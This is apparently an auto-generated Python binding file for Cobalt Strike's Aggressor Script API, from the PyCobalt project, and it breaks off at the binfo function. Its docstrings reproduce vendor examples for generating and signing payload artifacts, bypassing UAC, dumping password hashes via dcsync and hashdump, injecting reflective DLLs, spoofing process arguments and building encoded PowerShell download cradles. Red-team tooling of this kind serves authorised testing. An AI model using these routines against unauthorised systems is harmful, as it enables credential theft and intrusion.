"""
For calling aggressor functions

Warning: This file is auto-generated by ./parse_functions_page.py
"""

import pycobalt.engine as engine


def is64(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Check if a session is on an x64 system or not (Beacon only).
        Arguments
        $1 - Beacon/Session ID
        Example
        
        command x64 {
            foreach $session (beacons()) {
                if (-is64 $session['id']) {
                    println($session);
                }
            }
        }
        
    """

    return engine.call('-is64', args, fork=fork)


def isadmin(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Check if a session has admin rights
        Arguments
        $1 - Beacon/Session ID
        Example
        
        command admin_sessions {
            foreach $session (beacons()) {
                if (-isadmin $session['id']) {
                    println($session);
                }
            }
        }
        
    """

    return engine.call('-isadmin', args, fork=fork)


def isbeacon(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Check if a session is a Beacon or not.
        Arguments
        $1 - Beacon/Session ID
        Example
        
        command beacons {
            foreach $session (beacons()) {
                if (-isbeacon $session['id']) {
                    println($session);
                }
            }
        }
        
    """

    return engine.call('-isbeacon', args, fork=fork)


def isssh(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Check if a session is an SSH session or not.
        Arguments
        $1 - Beacon/Session ID
        Example
        
        command ssh_sessions {
            foreach $session (beacons()) {
                if (-isssh $session['id']) {
                    println($session);
                }
            }
        }
        
    """

    return engine.call('-isssh', args, fork=fork)


def action(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Post a public action message to the event log. This is similar to the /me command.
        Arguments
        $1 - the message
        Example
        
        action("dances!");
        
    """

    return engine.call('action', args, fork=fork)


def addTab(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        create a tab to display a GUI object.
        Arguments
        $1 - the title of the tab
        $2 - a GUI object. A GUI object is one that is an instance of javax.swing.JComponent.
        $3 - a tooltip to display when a user hovers over this tab.
        Example
        
        $label = [new javax.swing.JLabel: "Hello World"];
        addTab("Hello!", $label, "this is an example");
        
    """

    return engine.call('addTab', args, fork=fork)


def addVisualization(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Register a visualization with Cobalt Strike.
        Arguments
        $1 - the name of the visualization
        $2 - a javax.swing.JComponent object
        Example
        
        $label = [new javax.swing.JLabel: "Hello World!"];
        addVisualization("Hello World", $label);
        
        See Also
        &showVisualization
        
    """

    return engine.call('addVisualization', args, fork=fork)


def add_to_clipboard(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Add text to the clipboard, notify the user.
        Arguments
        $1 - the text to add to the clipboard
        Example
        
        add_to_clipboard("Paste me you fool!");
        
    """

    return engine.call('add_to_clipboard', args, fork=fork)


def alias(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Creates an alias command in the Beacon console
        Arguments
        $1 - the alias name to bind to
        $2 - a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments.
        Example
        
        alias("foo", {
            btask($1, "foo!");
        });
        
    """

    return engine.call('alias', args, fork=fork)


def applications(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.
        Returns
        An array of dictionary objects with information about each application.
        Example
        
        printAll(applications());
        
    """

    return engine.call('applications', args, fork=fork)


def archives(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.
        Returns
        An array of dictionary objects with information about your team's activity.
        Example
        
        foreach $index => $entry (archives()) {
            println("\c3( $+ $index $+ )\o $entry");
        }
        
    """

    return engine.call('archives', args, fork=fork)


def artifact(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generates an artifact (exe, dll) from a Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - the artifact type
        $3 - true/false: is this shellcode destined for a remote target?
        $4 - x86|x64 - the architecture of the generated stager
        
        
        Type
        Description
        
        
        dll
        an x86 DLL
        
        
        dllx64
        an x64 DLL
        
        
        exe
        a plain executable
        
        
        powershell
        a powershell script
        
        
        python
        a python script
        
        
        svcexe
        a service executable
        
        
        vbscript
        a Visual Basic script
        
        
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing the specified artifact.
        Example
        
        $data = artifact("my listener", "exe");
        
        $handle = openf(">out.exe");
        writeb($handle, $data);
        closef($handle);
        
    """

    return engine.call('artifact', args, fork=fork)


def artifact_sign(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sign an EXE or DLL file
        Arguments
        $1 - the contents of the EXE or DLL file to sign
        Notes
        1. This function requires that a code-signing certificate is specified in this server's Malleable C2 profile. If no code-signing certificate is configured, this function will return $1 with no changes.
        2. DO NOT sign an executable or DLL twice. The library Cobalt Strike uses for code-signing will create an invalid (second) signature if the executable or DLL is already signed.
        Returns
        A scalar containing the signed artifact.
        Example
        
        # generate an artifact!
        $data = artifact("my listener", "exe");
        
        # sign it.
        $data = artifact_sign($data);
        
        # save it
        $handle = openf(">out.exe");
        writeb($handle, $data);
        closef($handle);
        
    """

    return engine.call('artifact_sign', args, fork=fork)


def artifact_stageless(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener
        Arguments
        $1 - the listener name (must be local to this team server)
        $2 - the artifact type
        $3 - x86|x64 - the architecture of the generated stager
        $4 - proxy configuration string
        $5 - callback function. This function is called when the artifact is ready. The $1 argument is the stageless content.
        
        
        Type
        Description
        
        
        dll
        an x86 DLL
        
        
        dllx64
        an x64 DLL
        
        
        exe
        a plain executable
        
        
        powershell
        a powershell script
        
        
        raw
        raw payload stage
        
        
        svcexe
        a service executable
        
        
        Notes
        1. This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.
        2. The proxy configuration string is the same string you would use with Attacks -> Packages -> Windows Executable (S). *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:password@host:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior. Custom dialogs may use &drow_proxyserver to set this.
        3. This function cannot generate artifacts for listeners on other team servers. This function also cannot generate artifacts for foreign listeners. Limit your use of this function to local listers with stages only. Custom dialogs may use &drow_listener_stage to choose an acceptable listener for this function.
        Example
        
        sub ready {
            local('$handle');
            $handle = openf(">out.exe");
            writeb($handle, $1);
            closef($handle);
        }
        
        artifact_stageless("my listener", "exe", "x86", "", &ready);
        
    """

    return engine.call('artifact_stageless', args, fork=fork)


def bargue_add(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        This function adds an option to Beacon's list of commands to spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to spoof arguments for. Environment variables are OK here too.
        $3 - the fake arguments to use when the specified command is run.
        Notes
        The process match is exact. If Beacon tries to launch "net.exe", it will not match net, NET.EXE, or c:\windows\system32\net.exe. It will only match net.exe.
        x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.
        The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.
        Example
        
        # spoof cmd.exe arguments.
        bargue_add($1, "%COMSPEC%", "/K \"cd c:\windows\temp & startupdatenow.bat\"");
        
        # spoof net arguments
        bargue_add($1, "net", "user guest /active:no");
        
    """

    return engine.call('bargue_add', args, fork=fork)


def bargue_list(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        List the commands + fake arguments Beacon will spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        bargue_list($1);
        
    """

    return engine.call('bargue_list', args, fork=fork)


def bargue_remove(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        This function removes an option to Beacon's list of commands to spoof arguments for.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to spoof arguments for. Environment variables are OK here too.
        Example
        
        # don't spoof cmd.exe
        bargue_remove($1, "%COMSPEC%");
        
    """

    return engine.call('bargue_remove', args, fork=fork)


def base64_decode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Unwrap a base64-encoded string
        Arguments
        $1 - the string to decode
        Returns
        The argument processed by a base64 decoder
        Example
        
        println(base64_decode(base64_encode("this is a test")));
        
    """

    return engine.call('base64_decode', args, fork=fork)


def base64_encode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Base64 encode a string
        Arguments
        $1 - the string to encode
        Returns
        The argument processed by a base64 encoder
        Example
        
        println(base64_encode("this is a test"));
        
    """

    return engine.call('base64_encode', args, fork=fork)


def bbrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate the beacon browser GUI component. Shows only Beacons.
        Returns
        The beacon browser GUI object (a javax.swing.JComponent)
        Example
        
        addVisualization("Beacon Browser", bbrowser());
        
        See Also
        &showVisualization
        
    """

    return engine.call('bbrowser', args, fork=fork)


def bbrowserpivot(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Start a Browser Pivot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the browser pivot agent into.
        $3 - the architecture of the target PID (x86|x64)
        Example
        
        bbrowserpivot($1, 1234, "x86");
        
    """

    return engine.call('bbrowserpivot', args, fork=fork)


def bbrowserpivot_stop(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Stop a Browser Pivot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        bbrowserpivot_stop($1);
        
    """

    return engine.call('bbrowserpivot_stop', args, fork=fork)


def bbypassuac(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Run the bypass UAC attack.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the listener to target.
        Example
        
        item "&Bypass UAC" {
            openPayloadHelper(lambda({
                binput($bids, "bypassuac $1");
                bbypassuac($bids, $1);
            }, $bids => $1));
        }
        
    """

    return engine.call('bbypassuac', args, fork=fork)


def bcancel(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Cancel a file download
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to cancel or a wildcard.
        Example
        
        item "&Cancel Downloads" {
            bcancel($1, "*");
        }
        
    """

    return engine.call('bcancel', args, fork=fork)


def bcd(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to change it's current working directory.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to change to.
        Example
        
        # create a command to change to the user's home directory
        alias home {
            $home = "c:\\users\\" . binfo($1, "user");
            bcd($1, $home);
        }
        
    """

    return engine.call('bcd', args, fork=fork)


def bcheckin(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to checkin. This is basically a no-op for Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "&Checkin" {
            binput($1, "checkin");
            bcheckin($1);
        }
        
    """

    return engine.call('bcheckin', args, fork=fork)


def bclear(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        This is the "oops" command. It clears the queued tasks for the specified beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        bclear($1);
        
    """

    return engine.call('bclear', args, fork=fork)


def bconnect(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to connect to
        Example
        
        bconnect($1, "DC");
        
    """

    return engine.call('bconnect', args, fork=fork)


def bcovertvpn(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to deploy a Covert VPN client.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the Covert VPN interface to deploy
        $3 - the IP address of the interface [on target] to bridge into
        $4 - [optional] the MAC address of the Covert VPN interface
        Example
        
        bcovertvpn($1, "phear0", "172.16.48.18");
        
    """

    return engine.call('bcovertvpn', args, fork=fork)


def bcp(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to copy a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to copy
        $3 - the destination
        Example
        
        bcp($1, "evil.exe", "\\\\target\\C$\\evil.exe");
        
    """

    return engine.call('bcp', args, silent=silent, fork=fork)


def bdata(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get metadata for a Beacon session.
        Arguments
        $1 - the id for the beacon to pull metadata for
        Returns
        A dictionary object with metadata about the Beacon session.
        Example
        
        println(bdata("1234"));
        
    """

    return engine.call('bdata', args, fork=fork)


def bdcsync(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Use mimikatz's dcsync command to pull a user's password hash from a domain controller.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - fully qualified name of the domain
        $3 - DOMAIN\user to pull hashes for (optional)
        Notes
        If $3 is left out, dcsync will dump all domain hashes.
        Example
        
        # dump a specific account
        bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");
        
        # dump all accounts
        bdcsync($1, "PLAYLAND.testlab");
        
    """

    return engine.call('bdcsync', args, fork=fork)


def bdesktop(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Start a VNC session.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "&Desktop (VNC)" {
            bdesktop($1);
        }
        
    """

    return engine.call('bdesktop', args, fork=fork)


def bdllinject(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Inject a Reflective DLL into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the DLL into
        $3 - the local path to the Reflective DLL
        Example
        
        bdllinject($1, 1234, script_resource("test.dll"));
        
    """

    return engine.call('bdllinject', args, fork=fork)


def bdllload(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Call LoadLibrary() in a remote process with the specified DLL.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target process PID
        $3 - the on-target path to a DLL
        Notes
        The DLL must be the same architecture as the target process.
        Example
        
        bdllload($1, 1234, "c:\\windows\\mystuff.dll");
        
    """

    return engine.call('bdllload', args, fork=fork)


def bdllspawn(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Spawn a Reflective DLL as a Beacon post-exploitation job.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the Reflective DLL
        $3 - a parameter to pass to the DLL
        $4 - a short description of this post exploitation job (shows up in jobs output)
        $5 - how long to block and wait for output (specified in milliseconds)
        $6 - true/false; use impersonated token when running this post-ex job?
        Notes
        This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.
        A well-behaved Reflective DLL follows these rules:
        1. Receives a parameter via the reserved DllMain parameter when the DLL_PROCESS_ATTACH reason is specified.
        2. Prints messages to STDOUT
        3. Calls fflush(stdout) to flush STDOUT
        4. Calls ExitProcess(0) when done. This kills the spawned process to host the capability.
        Example (ReflectiveDll.c)
        This example is based on Stephen Fewer's Reflective DLL Injection Project:
        
        BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
            BOOL bReturnValue = TRUE;
            switch( dwReason ) {
                case DLL_QUERY_HMODULE:
                    if( lpReserved != NULL )
                        *(HMODULE *)lpReserved = hAppInstance;
                    break;
                case DLL_PROCESS_ATTACH:
                    hAppInstance = hinstDLL;
        
                    /* print some output to the operator */
                    if (lpReserved != NULL) {
                        printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
                    }
                    else {
                        printf("Hello from test.dll. There is no parameter\n");
                    }
        
                    /* flush STDOUT */
                    fflush(stdout);
        
                    /* we're done, so let's exit */
                    ExitProcess(0);
                    break;
                case DLL_PROCESS_DETACH:
                case DLL_THREAD_ATTACH:
                case DLL_THREAD_DETACH:
                    break;
            }
            return bReturnValue;
        }
        
        Example (Aggressor Script)
        
        alias hello {
            bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
        }
        
    """

    return engine.call('bdllspawn', args, silent=silent, fork=fork)


def bdownload(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to download a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to request
        Example
        
        bdownload($1, "c:\\sysprep.inf");
        
    """

    return engine.call('bdownload', args, silent=silent, fork=fork)


def bdrives(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to list the drives on the compromised system
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "&Drives" {
            binput($1, "drives");
            bdrives($1);
        }
        
    """

    return engine.call('bdrives', args, fork=fork)


def beacon_command_describe(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Describe a Beacon command.
        Returns
        A string description of the Beacon command.
        Arguments
        $1 - the command
        Example
        
        println(beacon_command_describe("ls"));
        
    """

    return engine.call('beacon_command_describe', args, fork=fork)


def beacon_command_detail(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the help information for a Beacon command.
        Returns
        A string with helpful information about a Beacon command.
        Arguments
        $1 - the command
        Example
        
        println(beacon_command_detail("ls"));
        
    """

    return engine.call('beacon_command_detail', args, fork=fork)


def beacon_command_register(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Register help information for a Beacon command.
        Arguments
        $1 - the command
        $2 - the short description of the command
        $3 - the long-form help for the command.
        Example
        
        alis echo {
            blog($1, "You typed: " . substr($1, 5));
        }
        
        beacon_command_register(
            "echo",
            "echo text to beacon log",
            "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
        
    """

    return engine.call('beacon_command_register', args, fork=fork)


def beacon_commands(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get a list of Beacon commands.
        Returns
        An array of Beacon commands.
        Example
        
        printAll(beacon_commands());
        
    """

    return engine.call('beacon_commands', args, fork=fork)


def beacon_data(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get metadata for a Beacon session.
        Arguments
        $1 - the id for the beacon to pull metadata for
        Returns
        A dictionary object with metadata about the Beacon session.
        Example
        
        println(beacon_data("1234"));
        
    """

    return engine.call('beacon_data', args, fork=fork)


def beacon_execute_job(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Run a command and report its output to the user.
        Arguments
        $1 - the Beacon ID
        $2 - the command to run (environment variables are resolved)
        $3 - the command arguments (environment variables are not resolved).
        $4 - flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)
        Notes
        
        The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!
        This is the mechanism Cobalt Strike uses for its shell and powershell commands.
        
        Example
        
        alias shell {
            local('$args');
            $args = substr($0, 6);
            btask($1, "Tasked beacon to run: $args", "T1059");
            beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
        }
        
    """

    return engine.call('beacon_execute_job', args, fork=fork)


def beacon_exploit_describe(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Describe a Beacon exploit
        Returns
        A string description of the Beacon exploit
        Arguments
        $1 - the exploit
        Example
        
        println(beacon_exploit_describe("ms14-058"));
        
        See Also
        &beacon_exploit_register, &beacon_exploits, &belevate
    """

    return engine.call('beacon_exploit_describe', args, fork=fork)


def beacon_exploit_register(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Register a Beacon privilege escalation exploit with Cobalt Strike
        Arguments
        $1 - the exploit short name
        $2 - a description of the exploit
        $3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)
        Example
        
        # Integrate windows/local/ms16_016_webdav from Metasploit
        # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
        
        sub ms16_016_exploit {
            # check if we're on an x64 system and error out.
            if (-is64 $1) {
                berror($1, "ms16-016 exploit is x86 only");
                return;
            }
        
            # acknowledge this command
            btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
        
            # generate our shellcode
            $stager = shellcode($2, false, "x86");
        
            # spawn a Beacon post-ex job with the exploit DLL
            bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
        
            # stage our payload (if this is a bind payload)
            bstage($1, $null, $2, $arch);
        }
        
        beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
        
        See Also
        &beacon_exploit_describe, &beacon_exploits, &belevate
        
    """

    return engine.call('beacon_exploit_register', args, fork=fork)


def beacon_exploits(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get a list of privilege escalation exploits registered with Cobalt Strike.
        Returns
        An array of Beacon exploits.
        Example
        
        printAll(beacon_exploits());
        
        See also
        &beacon_exploit_describe, &beacon_exploit_register, &belevate
        
    """

    return engine.call('beacon_exploits', args, fork=fork)


def beacon_host_imported_script(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.
        Arguments
        $1 - the id of the Beacon to host this script with.
        Returns
        A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!
        Example
        
        alias powershell {
            local('$args $cradle $runme $cmd');
        
            # $0 is the entire command with no parsing.
            $args   = substr($0, 11);
        
            # generate the download cradle (if one exists) for an imported PowerShell script
            $cradle = beacon_host_imported_script($1);
        
            # encode our download cradle AND cmdlet+args we want to run
            $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
        
            # Build up our entire command line.
            $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
        
            # task Beacon to run all of this.
            btask($1, "Tasked beacon to run: $args", "T1086");
            beacon_execute_job($1, "powershell", $cmd, 1);
        }
        
    """

    return engine.call('beacon_host_imported_script', args, fork=fork)


def beacon_host_script(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.
        Arguments
        $1 - the id of the Beacon to host this script with.
        $2 - the script data to host.
        Returns
        A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!
        Example
        
        alias test {
            local('$script $hosted');
            $script = "2 + 2";
            $hosted = beacon_host_script($1, $script);
        
            binput($1, "powerpick $hosted");
            bpowerpick($1, $hosted);
        }
        
    """

    return engine.call('beacon_host_script', args, fork=fork)


def beacon_ids(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the ID of all Beacons calling back to this Cobalt Strike team server.
        Returns
        An array of beacon IDs
        Example
        
        foreach $bid (beacon_ids()) {
            println("Bid: $bid");
        }
        
    """

    return engine.call('beacon_ids', args, fork=fork)


def beacon_info(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information from a Beacon session's metadata.
        Arguments
        $1 - the id for the beacon to pull metadata for
        $2 - the key to extract
        Returns
        A string with the requested information.
        Example
        
        println("User is: " . beacon_info("1234", "user"));
        println("PID  is: " . beacon_info("1234", "pid"));
        
    """

    return engine.call('beacon_info', args, fork=fork)


def beacon_remove(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Remove a Beacon from the display.
        Arguments
        $1 - the id for the beacon to remove
    """

    return engine.call('beacon_remove', args, fork=fork)


def beacons(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information about all Beacons calling back to this Cobalt Strike team server.
        Returns
        An array of dictionary objects with information about each beacon.
        Example
        
        foreach $beacon (beacons()) {
            println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
        }
        
    """

    return engine.call('beacons', args, fork=fork)


def belevate(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to elevate with a memory corruption exploit.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the exploit to fire
        $3 - the listener to target.
        Example
        
        item "&Elevate 31337" {
            openPayloadHelper(lambda({
                binput($bids, "elevate ms14-058 $1");
                belevate($bids, "ms14-058", $1);
            }, $bids => $1));
        }
        
        See Also
        &beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits
        
    """

    return engine.call('belevate', args, fork=fork)


def berror(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Publish an error message to the Beacon transcript
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        
        alias donotrun {
            berror($1, "You should never run this command!");
        }
        
    """

    return engine.call('berror', args, fork=fork)


def bexecute(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to execute a command [without a shell]. This provides no output to the user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        
        bexecute($1, "notepad.exe");
        
    """

    return engine.call('bexecute', args, silent=silent, fork=fork)


def bexecute_assembly(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Spawns a local .NET executable assembly as a Beacon post-exploitation job.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the .NET executable assembly
        $3 - parameters to pass to the assembly
        Notes
        
        This command accepts a valid .NET executable and calls its entry point.
        This post-exploitation job (like others) runs with the primary token of your Beacon process. It does not inherit Beacon's thread token.
        Compile your custom .NET programs with a .NET 3.5 compiler for compatability with systems that don't have .NET 4.0 and later.
        
        Example
        
        alias myutil {
            bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
        }
        
    """

    return engine.call('bexecute_assembly', args, silent=silent, fork=fork)


def bexit(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to exit.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "&Die" {
            binput($1, "exit");
            bexit($1);
        }
        
    """

    return engine.call('bexit', args, fork=fork)


def bgetprivs(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Attempts to enable the specified privilege in your Beacon session.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - a comma-separated list of privileges to enable. See:
        https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
        Example
        
        alias debug {
            bgetprivs($1, "SeDebugPriv");
        }
        
    """

    return engine.call('bgetprivs', args, fork=fork)


def bgetsystem(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to attempt to get the SYSTEM token.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "Get &SYSTEM" {
            binput($1, "getsystem");
            bgetsystem($1);
        }
        
    """

    return engine.call('bgetsystem', args, fork=fork)


def bgetuid(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to print the User ID of the current token
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        
        bgetuid($1);
        
    """

    return engine.call('bgetuid', args, fork=fork)


def bhashdump(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to dump local account password hashes.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "Dump &Hashes" {
            binput($1, "hashdump");
            bhashdump($1);
        }
        
    """

    return engine.call('bhashdump', args, silent=silent, fork=fork)


def binfo(*args, fork=False):
    r"""
